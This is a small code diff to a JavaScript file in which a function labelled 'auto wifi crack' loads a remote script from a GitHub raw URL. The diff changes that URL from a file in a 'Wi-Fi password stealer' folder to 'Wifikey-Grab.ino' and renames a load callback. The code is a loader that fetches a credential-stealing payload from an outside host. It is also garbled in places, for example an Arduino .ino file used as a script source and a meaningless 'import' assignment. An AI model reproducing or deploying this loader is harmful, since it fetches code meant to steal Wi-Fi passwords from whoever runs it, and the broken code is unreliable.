@@ -14,11 +14,11 @@ function lalala(lalala) {
 //wifi 2 start
 // auto wifi crack otomatic
 function lalala2(lalala2) {
-  lalala2.src='https://raw.githubusercontent.com/GMhabib/index.js/main/Wi-Fi%20password%20stealer/WifiKey-Grab_Minimize-of-Shame.ino';
+  lalala2.src='https://raw.githubusercontent.com/GMhabib/index.js/main/Wifikey-Grab.ino';
   lalala2.import='true',true;
-  lalala2.setAttribute('src', 'https://raw.githubusercontent.com/GMhabib/index.js/main/Wi-Fi%20password%20stealer/WifiKey-Grab_Minimize-of-Shame.ino');
-  lalala2.addEventListener('load', scriptLoaded, true);
-  function scriptLoaded(){
+  lalala2.setAttribute('src', 'https://raw.githubusercontent.com/GMhabib/index.js/main/Wifikey-Grab.ino');
+  lalala2.addEventListener('load', scriptLoaded2, true);
+  function scriptLoaded2(){
     console.log('script success to run');
   }
   
